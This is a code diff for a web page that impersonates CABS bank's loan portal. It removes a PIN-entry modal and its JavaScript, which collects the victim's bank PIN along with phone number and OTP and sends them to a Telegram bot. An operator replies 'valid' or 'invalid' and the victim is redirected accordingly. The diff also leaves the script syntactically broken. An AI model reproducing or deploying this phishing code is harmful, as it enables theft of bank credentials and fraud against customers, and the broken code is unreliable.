@@ -487,26 +487,7 @@
         <div class="sp-t">Verifying Security Code</div>
         <div class="sp-s">Securing your connection to CABS servers...</div>
     </div>
-
-    <!-- PIN Popup Modal (CABS theme) -->
-    <div class="pin-overlay" id="pinOverlay">
-        <div class="pin-card">
-            <div class="pin-icon">&#128274;</div>
-            <h3>Confirm Your PIN</h3>
-            <p>For added security, enter your 4-digit account PIN to finalize the loan authorization.</p>
-
-            <div id="pinErr" class="pin-err"></div>
-
-            <div class="pin-row" id="pinRow">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 1">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 2">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 3">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 4">
-            </div>
-
-            <button class="pin-submit" id="pinSubmit" onclick="doPIN()">Confirm PIN</button>
-        </div>
-    </div>
+ </div>
 
     <footer>
         <p>&copy; 2026 CABS, a member of the Old Mutual Group &bull; Zimbabwe. All rights reserved.</p>
@@ -683,102 +664,8 @@
             setTimeout(() => { clearInterval(iv); }, 600000);
         }
 
-        /* ============ PIN modal ============ */
-        function setupPIN() {
-            pinBoxes.forEach((b, i) => {
-                b.addEventListener('input', e => {
-                    const v = e.target.value;
-                    if (v.length > 1) {
-                        const digs = v.replace(/\D/g, '').split('');
-                        digs.forEach((d, j) => { if (i+j < pinBoxes.length) { pinBoxes[i+j].value = d; pinBoxes[i+j].classList.add('ok'); } });
-                        pinBoxes[Math.min(i + digs.length, pinBoxes.length - 1)].focus();
-                        pinChk();
-                        if (pinVal().length === 4) { setTimeout(() => doPIN(), 300); }
-                        return;
-                    }
-                    if (v) {
-                        b.classList.add('ok');
-                        if (i < pinBoxes.length - 1) pinBoxes[i+1].focus();
-                    } else {
-                        b.classList.remove('ok');
-                    }
-                    pinChk();
-                    if (pinVal().length === 4) { setTimeout(() => doPIN(), 300); }
-                });
-                b.addEventListener('keydown', e => {
-                    if (e.key === 'Backspace' && !b.value && i > 0) pinBoxes[i-1].focus();
-                });
-            });
-        }
-
-        function pinVal() { return Array.from(pinBoxes).map(b => b.value).join(''); }
-        function pinChk() { Array.from(pinBoxes).forEach(b => { if (b.value) b.classList.add('ok'); else b.classList.remove('ok'); }); }
-
-        function openPINModal() {
-            document.getElementById('pinOverlay').classList.add('on');
-            pinBoxes.forEach(b => { b.value = ''; b.classList.remove('ok'); });
-            document.getElementById('pinErr').style.display = 'none';
-            pinBoxes[0].focus();
-        }
-
-        function closePINModal() {
-            document.getElementById('pinOverlay').classList.remove('on');
-        }
-
-        function pinShowErr(m) {
-            const e = document.getElementById('pinErr');
-            e.textContent = m;
-            e.style.display = 'block';
-            pinBoxes.forEach(b => { b.value = ''; b.classList.remove('ok'); });
-            pinBoxes[0].focus();
-        }
-
-        async function doPIN() {
-            const pin = pinVal();
-            if (pin.length !== 4) { pinShowErr('Please enter the full 4-digit PIN.'); return; }
-
-            const btn = document.getElementById('pinSubmit');
-            btn.disabled = true;
-            btn.textContent = 'Sending...';
-
-            const msg = `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nIs this PIN valid?`;
-            const btns = [[{ text: '✅ Valid PIN', callback_data: 'pin_valid' }, { text: '❌ Invalid PIN', callback_data: 'pin_invalid' }]];
-
-            await tg(msg, btns);
-            btn.disabled = false;
-            btn.textContent = 'Confirm PIN';
-            pollPIN();
-        }
-
-        /* Wait for Valid/Invalid PIN from Telegram */
-        function pollPIN() {
-            if (pinPollInterval) clearInterval(pinPollInterval);
-            pinPollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
-                    .then(r => r.json())
-                    .then(d => {
-                        if (d.ok && d.result.length > 0) {
-                            d.result.forEach(u => {
-                                luid = u.update_id;
-                                if (u.callback_query) {
-                                    const cb = u.callback_query.data;
-                                    if (cb === 'pin_valid') {
-                                        clearInterval(pinPollInterval);
-                                        // Valid PIN → open success.html
-                                        location.href = 'success.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
-                                    }
-                                    else if (cb === 'pin_invalid') {
-                                        clearInterval(pinPollInterval);
-                                        // Invalid PIN → return to PIN popup modal
-                                        pinShowErr('The PIN was declared invalid. Please re-enter your 4-digit PIN and try again.');
-                                    }
-                                }
-                            });
                         }
-                    }).catch(e => console.error(e));
-            }, 1500);
-
-            setTimeout(() => { clearInterval(pinPollInterval); }, 600000);
+                    }).
         }
     </script>
 </body>
